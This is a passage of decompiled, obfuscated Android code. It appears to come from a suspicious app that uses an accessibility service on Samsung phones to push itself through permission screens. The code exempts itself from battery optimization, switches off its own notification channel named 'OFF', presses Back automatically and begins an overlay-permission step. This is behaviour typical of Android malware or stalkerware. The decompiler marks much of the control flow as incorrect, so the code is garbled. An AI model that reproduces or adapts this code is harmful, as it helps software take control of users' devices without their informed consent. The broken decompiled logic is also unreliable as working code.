    /* JADX WARN: Removed duplicated region for block: B:55:0x00e6 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:16:0x0040, B:53:0x00dc, B:55:0x00e6, B:57:0x00ec, B:60:0x00f1, B:65:0x010a, B:67:0x0110, B:71:0x012a, B:76:0x0149, B:31:0x007d, B:52:0x00cf, B:34:0x0083, B:49:0x00c1), top: B:82:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r6v0 */
    /* JADX WARN: Type inference failed for: r6v1 */
    /* JADX WARN: Type inference failed for: r6v11 */
    /* JADX WARN: Type inference failed for: r6v13 */
    /* JADX WARN: Type inference failed for: r6v16 */
    /* JADX WARN: Type inference failed for: r6v2, types: [com.storm.safe.rock.service.modules.yw5xud.a7] */
    /* JADX WARN: Type inference failed for: r6v21 */
    /* JADX WARN: Type inference failed for: r6v22 */
    /* JADX WARN: Type inference failed for: r6v23 */
    /* JADX WARN: Type inference failed for: r6v24 */
    /* JADX WARN: Type inference failed for: r6v3 */
    /* JADX WARN: Type inference failed for: r6v7 */
    /* JADX WARN: Type inference failed for: r6v8 */
    /* JADX WARN: Type inference failed for: r6v9, types: [com.storm.safe.rock.service.modules.yw5xud.a7] */
    /* JADX WARN: Type inference failed for: r8v0 */
    /* JADX WARN: Type inference failed for: r8v12 */
    /* JADX WARN: Type inference failed for: r8v9 */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212363a6(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$executeBasicPermissions$1 samsungSteps$executeBasicPermissions$1;
        C0370a7 c0370a7;
        Object objM212370b5;
        long jCurrentTimeMillis;
        long j;
        int i;
        C0370a7 c0370a72;
        SamsungSteps$executeBasicPermissions$1 samsungSteps$executeBasicPermissions$12;
        int i2;
        int i3;
        int i4;
        int i5;
        int i6;
        C0370a7 c0370a73;
        if (continuationImpl instanceof SamsungSteps$executeBasicPermissions$1) {
            samsungSteps$executeBasicPermissions$1 = (SamsungSteps$executeBasicPermissions$1) continuationImpl;
            int i7 = samsungSteps$executeBasicPermissions$1.f54695a7;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                samsungSteps$executeBasicPermissions$1.f54695a7 = i7 - Integer.MIN_VALUE;
            } else {
                samsungSteps$executeBasicPermissions$1 = new SamsungSteps$executeBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$executeBasicPermissions$1.f54693a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i8 = samsungSteps$executeBasicPermissions$1.f54695a7;
        SamsungSteps$FlowType samsungSteps$FlowType = SamsungSteps$FlowType.f54672a0;
        ?? r6 = 5;
        ?? r8 = 2;
        int i9 = 3;
        try {
            if (i8 == 0) {
                kg1.m213544f4(obj);
                w20 w20Var = this.f55136a3;
                if (w20Var.m214993a8(samsungSteps$FlowType)) {
                    return Boolean.TRUE;
                }
                if (w20Var.m214987a2(samsungSteps$FlowType)) {
                    t60.m214726f4(this.f55135a2, "[基础权限] 达到最大尝试次数");
                    w20Var.m214996b1(samsungSteps$FlowType);
                    return Boolean.TRUE;
                }
                w20Var.m214989a4(samsungSteps$FlowType);
                try {
                    umrkmgrri.f55158a3.start(this.f55134a1);
                    samsungSteps$executeBasicPermissions$1.f54688a0 = this;
                    samsungSteps$executeBasicPermissions$1.f54695a7 = 1;
                    if (b81.m210571b1(800L, samsungSteps$executeBasicPermissions$1) != coroutineSingletons) {
                        c0370a7 = this;
                        samsungSteps$executeBasicPermissions$1.f54688a0 = c0370a7;
                        samsungSteps$executeBasicPermissions$1.f54695a7 = 2;
                        objM212370b5 = c0370a7.m212370b5(1500L, samsungSteps$executeBasicPermissions$1);
                        r6 = c0370a7;
                        if (objM212370b5 == coroutineSingletons) {
                        }
                        jCurrentTimeMillis = System.currentTimeMillis();
                        j = 20000;
                        i3 = 0;
                        i4 = 0;
                    }
                    return coroutineSingletons;
                } catch (Exception e) {
                    e = e;
                    r6 = this;
                    tz0.m214807a7("[基础权限] 异常: ", e.getMessage(), r6.f55135a2);
                    return Boolean.FALSE;
                }
            }
            if (i8 == 1) {
                C0370a7 c0370a74 = samsungSteps$executeBasicPermissions$1.f54688a0;
                kg1.m213544f4(obj);
                c0370a7 = c0370a74;
                samsungSteps$executeBasicPermissions$1.f54688a0 = c0370a7;
                samsungSteps$executeBasicPermissions$1.f54695a7 = 2;
                objM212370b5 = c0370a7.m212370b5(1500L, samsungSteps$executeBasicPermissions$1);
                r6 = c0370a7;
                if (objM212370b5 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                jCurrentTimeMillis = System.currentTimeMillis();
                j = 20000;
                i3 = 0;
                i4 = 0;
            } else if (i8 != 2) {
                try {
                    if (i8 == 3) {
                        i5 = samsungSteps$executeBasicPermissions$1.f54692a4;
                        i6 = samsungSteps$executeBasicPermissions$1.f54691a3;
                        j = samsungSteps$executeBasicPermissions$1.f54690a2;
                        jCurrentTimeMillis = samsungSteps$executeBasicPermissions$1.f54689a1;
                        c0370a73 = samsungSteps$executeBasicPermissions$1.f54688a0;
                        kg1.m213544f4(obj);
                    } else if (i8 == 4) {
                        i5 = samsungSteps$executeBasicPermissions$1.f54692a4;
                        i6 = samsungSteps$executeBasicPermissions$1.f54691a3;
                        j = samsungSteps$executeBasicPermissions$1.f54690a2;
                        jCurrentTimeMillis = samsungSteps$executeBasicPermissions$1.f54689a1;
                        c0370a73 = samsungSteps$executeBasicPermissions$1.f54688a0;
                        kg1.m213544f4(obj);
                    } else {
                        if (i8 != 5) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        int i10 = samsungSteps$executeBasicPermissions$1.f54692a4;
                        int i11 = samsungSteps$executeBasicPermissions$1.f54691a3;
                        j = samsungSteps$executeBasicPermissions$1.f54690a2;
                        jCurrentTimeMillis = samsungSteps$executeBasicPermissions$1.f54689a1;
                        C0370a7 c0370a75 = samsungSteps$executeBasicPermissions$1.f54688a0;
                        kg1.m213544f4(obj);
                        i = i11;
                        c0370a72 = c0370a75;
                        samsungSteps$executeBasicPermissions$12 = samsungSteps$executeBasicPermissions$1;
                        i2 = i10;
                        i3 = i2;
                        samsungSteps$executeBasicPermissions$1 = samsungSteps$executeBasicPermissions$12;
                        r6 = c0370a72;
                        i4 = i;
                        i9 = 3;
                    }
                    C0370a7 c0370a76 = c0370a73;
                    r8 = i6;
                    r6 = c0370a76;
                    i4 = r8;
                    i3 = i5;
                    i9 = 3;
                } catch (Exception e2) {
                    e = e2;
                    r6 = r8;
                    tz0.m214807a7("[基础权限] 异常: ", e.getMessage(), r6.f55135a2);
                    return Boolean.FALSE;
                }
            } else {
                C0370a7 c0370a77 = samsungSteps$executeBasicPermissions$1.f54688a0;
                kg1.m213544f4(obj);
                r6 = c0370a77;
                jCurrentTimeMillis = System.currentTimeMillis();
                j = 20000;
                i3 = 0;
                i4 = 0;
            }
            if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                if (r6.m212368b3()) {
                    if (r6.m212359a0()) {
                        int i12 = (i4 == true ? 1 : 0) + 1;
                        samsungSteps$executeBasicPermissions$1.f54688a0 = r6;
                        samsungSteps$executeBasicPermissions$1.f54689a1 = jCurrentTimeMillis;
                        samsungSteps$executeBasicPermissions$1.f54690a2 = j;
                        samsungSteps$executeBasicPermissions$1.f54691a3 = i12;
                        samsungSteps$executeBasicPermissions$1.f54692a4 = 0;
                        samsungSteps$executeBasicPermissions$1.f54695a7 = 4;
                        if (b81.m210571b1(400L, samsungSteps$executeBasicPermissions$1) != coroutineSingletons) {
                            i4 = i12;
                            i5 = 0;
                            r6 = r6;
                            i3 = i5;
                            i9 = 3;
                        }
                    } else {
                        samsungSteps$executeBasicPermissions$1.f54688a0 = r6;
                        samsungSteps$executeBasicPermissions$1.f54689a1 = jCurrentTimeMillis;
                        samsungSteps$executeBasicPermissions$1.f54690a2 = j;
                        samsungSteps$executeBasicPermissions$1.f54691a3 = i4 == true ? 1 : 0;
                        samsungSteps$executeBasicPermissions$1.f54692a4 = 0;
                        samsungSteps$executeBasicPermissions$1.f54695a7 = 5;
                        if (b81.m210571b1(300L, samsungSteps$executeBasicPermissions$1) != coroutineSingletons) {
                            i = i4 == true ? 1 : 0;
                            c0370a72 = r6;
                            samsungSteps$executeBasicPermissions$12 = samsungSteps$executeBasicPermissions$1;
                            i2 = 0;
                            i3 = i2;
                            samsungSteps$executeBasicPermissions$1 = samsungSteps$executeBasicPermissions$12;
                            r6 = c0370a72;
                            i4 = i;
                            i9 = 3;
                        }
                    }
                    return coroutineSingletons;
                }
                i5 = i3 + 1;
                if (i5 < i9) {
                    samsungSteps$executeBasicPermissions$1.f54688a0 = r6;
                    samsungSteps$executeBasicPermissions$1.f54689a1 = jCurrentTimeMillis;
                    samsungSteps$executeBasicPermissions$1.f54690a2 = j;
                    samsungSteps$executeBasicPermissions$1.f54691a3 = i4 == true ? 1 : 0;
                    samsungSteps$executeBasicPermissions$1.f54692a4 = i5;
                    samsungSteps$executeBasicPermissions$1.f54695a7 = i9;
                    r6 = r6;
                    i4 = i4;
                    if (b81.m210571b1(500L, samsungSteps$executeBasicPermissions$1) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    i3 = i5;
                    i9 = 3;
                }
                if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                }
            }
            r6.f55136a3.m214996b1(samsungSteps$FlowType);
            return Boolean.TRUE;
        } catch (Exception e3) {
            e = e3;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:47:0x00de, code lost:
    
        if (r11 == r3) goto L48;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00d1 A[Catch: Exception -> 0x0036, TryCatch #0 {Exception -> 0x0036, blocks: (B:14:0x0031, B:49:0x00e1, B:21:0x0043, B:44:0x00b6, B:46:0x00d1, B:24:0x0049, B:39:0x00a3, B:41:0x00a9), top: B:56:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r0v10 */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v16 */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212364a7(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$executeBatteryOptimization$1 samsungSteps$executeBatteryOptimization$1;
        C0370a7 c0370a7;
        C0370a7 c0370a72;
        Object systemService;
        C0370a7 c0370a73 = this.f55134a1;
        if (continuationImpl instanceof SamsungSteps$executeBatteryOptimization$1) {
            samsungSteps$executeBatteryOptimization$1 = (SamsungSteps$executeBatteryOptimization$1) continuationImpl;
            int i = samsungSteps$executeBatteryOptimization$1.f54699a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                samsungSteps$executeBatteryOptimization$1.f54699a3 = i - Integer.MIN_VALUE;
            } else {
                samsungSteps$executeBatteryOptimization$1 = new SamsungSteps$executeBatteryOptimization$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$executeBatteryOptimization$1.f54697a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = samsungSteps$executeBatteryOptimization$1.f54699a3;
        SamsungSteps$FlowType samsungSteps$FlowType = SamsungSteps$FlowType.f54673a1;
        try {
        } catch (Exception e) {
            e = e;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            w20 w20Var = this.f55136a3;
            if (w20Var.m214993a8(samsungSteps$FlowType)) {
                return Boolean.TRUE;
            }
            if (w20Var.m214987a2(samsungSteps$FlowType)) {
                t60.m214726f4(this.f55135a2, "[电池优化] 达到最大尝试次数");
                return Boolean.TRUE;
            }
            w20Var.m214989a4(samsungSteps$FlowType);
            try {
                Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                intent.setData(Uri.parse("package:" + c0370a73.getPackageName()));
                intent.setFlags(1350598656);
                c0370a73.startActivity(intent);
                samsungSteps$executeBatteryOptimization$1.f54696a0 = this;
                samsungSteps$executeBatteryOptimization$1.f54699a3 = 1;
                if (b81.m210571b1(2000L, samsungSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                    c0370a7 = this;
                }
                return coroutineSingletons;
            } catch (Exception e2) {
                e = e2;
                c0370a73 = this;
                tz0.m214807a7("[电池优化] 异常: ", e.getMessage(), c0370a73.f55135a2);
                return Boolean.FALSE;
            }
        }
        if (i2 != 1) {
            if (i2 != 2) {
                if (i2 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                C0370a7 c0370a74 = samsungSteps$executeBatteryOptimization$1.f54696a0;
                kg1.m213544f4(obj);
                c0370a73 = c0370a74;
                return Boolean.TRUE;
            }
            C0370a7 c0370a75 = samsungSteps$executeBatteryOptimization$1.f54696a0;
            kg1.m213544f4(obj);
            c0370a72 = c0370a75;
            systemService = c0370a72.f55134a1.getSystemService("power");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
            if (((PowerManager) systemService).isIgnoringBatteryOptimizations(c0370a72.f55134a1.getPackageName())) {
                c0370a72.f55136a3.m214996b1(samsungSteps$FlowType);
                samsungSteps$executeBatteryOptimization$1.f54696a0 = c0370a72;
                samsungSteps$executeBatteryOptimization$1.f54699a3 = 3;
                Object objM212369b4 = c0370a72.m212369b4(samsungSteps$executeBatteryOptimization$1);
                c0370a73 = c0370a72;
            }
            return Boolean.FALSE;
        }
        C0370a7 c0370a76 = samsungSteps$executeBatteryOptimization$1.f54696a0;
        kg1.m213544f4(obj);
        c0370a7 = c0370a76;
        boolean zM212359a0 = c0370a7.m212359a0();
        c0370a72 = c0370a7;
        if (zM212359a0) {
            samsungSteps$executeBatteryOptimization$1.f54696a0 = c0370a7;
            samsungSteps$executeBatteryOptimization$1.f54699a3 = 2;
            c0370a72 = c0370a7;
            if (b81.m210571b1(1000L, samsungSteps$executeBatteryOptimization$1) == coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        systemService = c0370a72.f55134a1.getSystemService("power");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
        if (((PowerManager) systemService).isIgnoringBatteryOptimizations(c0370a72.f55134a1.getPackageName())) {
        }
        return Boolean.FALSE;
    }

    /* JADX WARN: Code restructure failed: missing block: B:110:0x01ea, code lost:
    
        if (r2.m212369b4(r0) != r1) goto L112;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:103:0x01c4  */
    /* JADX WARN: Removed duplicated region for block: B:104:0x01c5 A[Catch: Exception -> 0x003d, PHI: r2
      0x01c5: PHI (r2v33 com.storm.safe.rock.service.modules.yw5xud.a7) = (r2v39 com.storm.safe.rock.service.modules.yw5xud.a7), (r2v40 com.storm.safe.rock.service.modules.yw5xud.a7) binds: [B:102:0x01c2, B:19:0x0042] A[DONT_GENERATE, DONT_INLINE], TryCatch #0 {Exception -> 0x003d, blocks: (B:14:0x0038, B:107:0x01d1, B:19:0x0042, B:104:0x01c5, B:22:0x0049, B:101:0x01b5, B:50:0x00a7, B:53:0x00f3), top: B:114:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:106:0x01d0  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x014e A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00a7 A[Catch: Exception -> 0x003d, TRY_ENTER, TryCatch #0 {Exception -> 0x003d, blocks: (B:14:0x0038, B:107:0x01d1, B:19:0x0042, B:104:0x01c5, B:22:0x0049, B:101:0x01b5, B:50:0x00a7, B:53:0x00f3), top: B:114:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x0104  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x010b A[Catch: Exception -> 0x0057, TRY_ENTER, TryCatch #2 {Exception -> 0x0057, blocks: (B:25:0x0052, B:81:0x016c, B:59:0x010b, B:61:0x0113, B:63:0x011b, B:66:0x0122, B:67:0x0126, B:69:0x012c, B:72:0x013a, B:75:0x014c, B:77:0x0150, B:82:0x0171, B:95:0x0198, B:97:0x01a3, B:96:0x019e, B:85:0x017c, B:87:0x0182, B:89:0x0188, B:91:0x018f, B:35:0x0073, B:38:0x007c), top: B:114:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0150 A[Catch: Exception -> 0x0057, TryCatch #2 {Exception -> 0x0057, blocks: (B:25:0x0052, B:81:0x016c, B:59:0x010b, B:61:0x0113, B:63:0x011b, B:66:0x0122, B:67:0x0126, B:69:0x012c, B:72:0x013a, B:75:0x014c, B:77:0x0150, B:82:0x0171, B:95:0x0198, B:97:0x01a3, B:96:0x019e, B:85:0x017c, B:87:0x0182, B:89:0x0188, B:91:0x018f, B:35:0x0073, B:38:0x007c), top: B:114:0x0026 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0171 A[Catch: Exception -> 0x0057, TryCatch #2 {Exception -> 0x0057, blocks: (B:25:0x0052, B:81:0x016c, B:59:0x010b, B:61:0x0113, B:63:0x011b, B:66:0x0122, B:67:0x0126, B:69:0x012c, B:72:0x013a, B:75:0x014c, B:77:0x0150, B:82:0x0171, B:95:0x0198, B:97:0x01a3, B:96:0x019e, B:85:0x017c, B:87:0x0182, B:89:0x0188, B:91:0x018f, B:35:0x0073, B:38:0x007c), top: B:114:0x0026 }] */
    /* JADX WARN: Type inference failed for: r2v35 */
    /* JADX WARN: Type inference failed for: r2v37 */
    /* JADX WARN: Type inference failed for: r2v38 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:80:0x016b -> B:81:0x016c). Please report as a decompilation issue!!! */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212365a8(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$executeNotificationChannel$1 samsungSteps$executeNotificationChannel$1;
        C0370a7 c0370a7;
        int i;
        int i2;
        C0370a7 c0370a72;
        int i3;
        int i4;
        int i5;
        C0370a7 c0370a73;
        int i6;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        C0370a7 c0370a74;
        Object objM212369b4;
        if (continuationImpl instanceof SamsungSteps$executeNotificationChannel$1) {
            samsungSteps$executeNotificationChannel$1 = (SamsungSteps$executeNotificationChannel$1) continuationImpl;
            int i7 = samsungSteps$executeNotificationChannel$1.f54706a6;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                samsungSteps$executeNotificationChannel$1.f54706a6 = i7 - Integer.MIN_VALUE;
            } else {
                samsungSteps$executeNotificationChannel$1 = new SamsungSteps$executeNotificationChannel$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$executeNotificationChannel$1.f54704a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        C0370a7 c0370a75 = samsungSteps$executeNotificationChannel$1.f54706a6;
        boolean zM212356a3 = false;
        SamsungSteps$FlowType samsungSteps$FlowType = SamsungSteps$FlowType.f54674a2;
        try {
            try {
            } catch (Exception e) {
                e = e;
            }
        } catch (Exception e2) {
            e = e2;
            c0370a75 = c0370a72;
        }
        switch (c0370a75) {
            case 0:
                kg1.m213544f4(obj);
                w20 w20Var = this.f55136a3;
                if (w20Var.m214993a8(samsungSteps$FlowType)) {
                    return Boolean.TRUE;
                }
                if (w20Var.m214987a2(samsungSteps$FlowType)) {
                    t60.m214726f4(this.f55135a2, "[通知类别] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                w20Var.m214989a4(samsungSteps$FlowType);
                c0370a7 = this;
                i = 1;
                if (i < 3) {
                    String str = c0370a7.f55135a2;
                    Context context = c0370a7.f55134a1;
                    t60.m214704c5(str, "[通知类别] 第" + i + "次尝试，直接打开OFF频道设置页");
                    Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                    intent.putExtra("android.provider.extra.APP_PACKAGE", context.getPackageName());
                    intent.putExtra("android.provider.extra.CHANNEL_ID", "OFF");
                    intent.setFlags(276824064);
                    context.startActivity(intent);
                    samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a7;
                    samsungSteps$executeNotificationChannel$1.f54701a1 = i;
                    samsungSteps$executeNotificationChannel$1.f54706a6 = 1;
                    if (b81.m210571b1(1000L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                        samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a7;
                        samsungSteps$executeNotificationChannel$1.f54701a1 = i;
                        samsungSteps$executeNotificationChannel$1.f54706a6 = 2;
                        if (c0370a7.m212370b5(1500L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                            c0370a72 = c0370a7;
                            i2 = i;
                            i3 = i2;
                            i4 = 0;
                            i5 = 1;
                            while (true) {
                                if (i5 < 6) {
                                    AccessibilityNodeInfo rootInActiveWindow = c0370a72.f55133a0.getRootInActiveWindow();
                                    if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("允许通知")) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it.hasNext()) {
                                            if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                                i4 = 1;
                                            }
                                        }
                                    }
                                    samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a72;
                                    samsungSteps$executeNotificationChannel$1.f54701a1 = i3;
                                    samsungSteps$executeNotificationChannel$1.f54702a2 = i4;
                                    samsungSteps$executeNotificationChannel$1.f54703a3 = i5;
                                    samsungSteps$executeNotificationChannel$1.f54706a6 = 3;
                                    if (b81.m210571b1(500L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                                        i5++;
                                    }
                                }
                            }
                            if (i4 == 0) {
                                t60.m214726f4(c0370a72.f55135a2, "[通知类别] ⚠️ 未进入频道设置页，重试");
                                c0370a72.f55133a0.performGlobalAction(1);
                                samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a72;
                                samsungSteps$executeNotificationChannel$1.f54701a1 = i3;
                                samsungSteps$executeNotificationChannel$1.f54706a6 = 4;
                                if (b81.m210571b1(500L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                                    i6 = i3;
                                    i = i6 + 1;
                                    c0370a7 = c0370a72;
                                    if (i < 3) {
                                    }
                                }
                            } else {
                                dqtvuisjd dqtvuisjdVar = c0370a72.f55133a0;
                                String str2 = c0370a72.f55135a2;
                                AccessibilityNodeInfo rootInActiveWindow2 = dqtvuisjdVar.getRootInActiveWindow();
                                if (rootInActiveWindow2 != null) {
                                    AccessibilityNodeInfo accessibilityNodeInfoM212358b2 = m212358b2(rootInActiveWindow2);
                                    if (accessibilityNodeInfoM212358b2 != null && accessibilityNodeInfoM212358b2.isChecked()) {
                                        zM212356a3 = m212356a3(accessibilityNodeInfoM212358b2);
                                    } else if (accessibilityNodeInfoM212358b2 != null && !accessibilityNodeInfoM212358b2.isChecked()) {
                                        zM212356a3 = true;
                                    }
                                }
                                if (zM212356a3) {
                                    t60.m214704c5(str2, "[通知类别] ✅ OFF 渠道已关闭");
                                } else {
                                    t60.m214726f4(str2, "[通知类别] ⚠️ 未能关闭OFF开关");
                                }
                                c0370a72.f55136a3.m214996b1(samsungSteps$FlowType);
                                samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a72;
                                samsungSteps$executeNotificationChannel$1.f54706a6 = 5;
                                if (b81.m210571b1(500L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                                    c0370a73 = c0370a72;
                                    c0370a73.f55133a0.performGlobalAction(1);
                                    samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a73;
                                    samsungSteps$executeNotificationChannel$1.f54706a6 = 6;
                                    c0370a74 = c0370a73;
                                    if (b81.m210571b1(500L, samsungSteps$executeNotificationChannel$1) == coroutineSingletons) {
                                        samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a74;
                                        samsungSteps$executeNotificationChannel$1.f54706a6 = 7;
                                        objM212369b4 = c0370a74.m212369b4(samsungSteps$executeNotificationChannel$1);
                                        c0370a75 = c0370a74;
                                        if (objM212369b4 == coroutineSingletons) {
                                        }
                                        return Boolean.TRUE;
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                return Boolean.FALSE;
            case 1:
                int i8 = samsungSteps$executeNotificationChannel$1.f54701a1;
                C0370a7 c0370a76 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                i = i8;
                c0370a7 = c0370a76;
                samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a7;
                samsungSteps$executeNotificationChannel$1.f54701a1 = i;
                samsungSteps$executeNotificationChannel$1.f54706a6 = 2;
                if (c0370a7.m212370b5(1500L, samsungSteps$executeNotificationChannel$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                i2 = samsungSteps$executeNotificationChannel$1.f54701a1;
                c0370a72 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                i3 = i2;
                i4 = 0;
                i5 = 1;
                while (true) {
                    if (i5 < 6) {
                    }
                    i5++;
                }
                if (i4 == 0) {
                }
                return coroutineSingletons;
            case 3:
                int i9 = samsungSteps$executeNotificationChannel$1.f54703a3;
                int i10 = samsungSteps$executeNotificationChannel$1.f54702a2;
                int i11 = samsungSteps$executeNotificationChannel$1.f54701a1;
                C0370a7 c0370a77 = samsungSteps$executeNotificationChannel$1.f54700a0;
                try {
                    kg1.m213544f4(obj);
                    i3 = i11;
                    i4 = i10;
                    c0370a72 = c0370a77;
                    i5 = i9 + 1;
                    while (true) {
                        if (i5 < 6) {
                        }
                        i5++;
                    }
                    if (i4 == 0) {
                    }
                } catch (Exception e3) {
                    e = e3;
                    c0370a75 = c0370a77;
                    tz0.m214807a7("[通知类别] 异常: ", e.getMessage(), c0370a75.f55135a2);
                    samsungSteps$executeNotificationChannel$1.f54700a0 = null;
                    samsungSteps$executeNotificationChannel$1.f54706a6 = 8;
                    break;
                }
                return coroutineSingletons;
            case 4:
                i6 = samsungSteps$executeNotificationChannel$1.f54701a1;
                c0370a72 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                i = i6 + 1;
                c0370a7 = c0370a72;
                if (i < 3) {
                }
                return Boolean.FALSE;
            case 5:
                C0370a7 c0370a78 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                c0370a73 = c0370a78;
                c0370a73.f55133a0.performGlobalAction(1);
                samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a73;
                samsungSteps$executeNotificationChannel$1.f54706a6 = 6;
                c0370a74 = c0370a73;
                if (b81.m210571b1(500L, samsungSteps$executeNotificationChannel$1) == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                C0370a7 c0370a79 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                c0370a74 = c0370a79;
                samsungSteps$executeNotificationChannel$1.f54700a0 = c0370a74;
                samsungSteps$executeNotificationChannel$1.f54706a6 = 7;
                objM212369b4 = c0370a74.m212369b4(samsungSteps$executeNotificationChannel$1);
                c0370a75 = c0370a74;
                if (objM212369b4 == coroutineSingletons) {
                }
                return Boolean.TRUE;
            case 7:
                C0370a7 c0370a710 = samsungSteps$executeNotificationChannel$1.f54700a0;
                kg1.m213544f4(obj);
                c0370a75 = c0370a710;
                return Boolean.TRUE;
            case 8:
                kg1.m213544f4(obj);
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:42:0x00c2, code lost:
    
        if (r11 == r2) goto L43;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00b5 A[Catch: Exception -> 0x0034, TryCatch #1 {Exception -> 0x0034, blocks: (B:14:0x002f, B:44:0x00c5, B:21:0x0041, B:39:0x00ad, B:41:0x00b5, B:24:0x0047, B:34:0x009a, B:36:0x00a0), top: B:53:0x0025 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v12 */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v18 */
    /* JADX WARN: Type inference failed for: r0v2, types: [com.storm.safe.rock.service.modules.yw5xud.a7] */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212366a9(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$executeOverlayPermission$1 samsungSteps$executeOverlayPermission$1;
        C0370a7 c0370a7;
        C0370a7 c0370a72;
        ?? r0 = "package:";
        if (continuationImpl instanceof SamsungSteps$executeOverlayPermission$1) {
            samsungSteps$executeOverlayPermission$1 = (SamsungSteps$executeOverlayPermission$1) continuationImpl;
            int i = samsungSteps$executeOverlayPermission$1.f54710a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                samsungSteps$executeOverlayPermission$1.f54710a3 = i - Integer.MIN_VALUE;
            } else {
                samsungSteps$executeOverlayPermission$1 = new SamsungSteps$executeOverlayPermission$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$executeOverlayPermission$1.f54708a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
